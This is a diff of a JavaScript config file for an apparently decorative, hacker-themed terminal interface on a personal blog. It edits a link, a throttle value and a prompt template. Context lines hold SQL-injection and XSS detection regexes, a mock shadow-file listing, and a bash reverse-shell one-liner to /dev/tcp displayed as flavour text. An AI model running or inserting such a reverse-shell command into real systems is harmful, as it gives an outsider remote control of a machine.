@@ -4,7 +4,7 @@ export const CONFIG = Object.freeze({
     subtitle: 'Hack Logon',
     additional: 'Is the flag here?',
     website: 'https://erzbir.com',
-    github: 'https://github.com/Erzbir',
+    github: 'https://github.com/Erzbir/jsnix',
     loadSpinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
     loadResult: '✓',
     buttonText: 'OK',
@@ -21,7 +21,6 @@ export const CONFIG = Object.freeze({
         maxInputLength: 16,
         triggerKey: 'Control',
         keySequenceLength: 5,
-        throttleDelay: 150,
         sqlPattern: /(\b(SELECT|UPDATE|DELETE|INSERT|UNION|DROP|CREATE|ALTER|EXEC|TRUNCATE|INTO|DECLARE|FROM)\b\s.*)|('.*--)|(\bOR\b\s+\S+\s*=\s*\S+)|(\bAND\b\s+\S+\s*=\s*\S+)|(\bOR\b\s+\d+\s*=\s*\d+)|(\bAND\b\s+\d+\s*=\s*\d+)|(--\s*$)|(\/\*.*\*\/)|(\b(CONCAT|CHAR|ASCII|HEX)\b\s*\()|(\bUNION\s+ALL\s+SELECT\b)/i,
         xssPattern: /['"<>]|<[^>]*>|javascript:|onerror=|onload=|eval\(|setTimeout\(|setInterval\(|\balert\b|\bprompt\b|\bconfirm\b|document\.cookie|document\.write/i
     },
@@ -36,6 +35,7 @@ export const CONFIG = Object.freeze({
         promptColor: '#98c379',
     },
     templates: {
+        prompt: '{{USER}}:{{PATH}}$ ',
         sysInfo: 'Blog Security Interface Version 3.0.0',
         envCheck: `[+] Initializing Security Grid...
 [{{LOADING}}] OS Integrity
@@ -92,6 +92,5 @@ www-data:*:19360:0:99999:7:::
 nobody:*:19360:0:99999:7:::
 > /bin/bash -c '/bin/bash -i >& /dev/tcp/{{LOCAL_IP}}/5555 0>&1'
 `,
-        prompt: '{{USER}}:{{PATH}}$ '
     }
 });
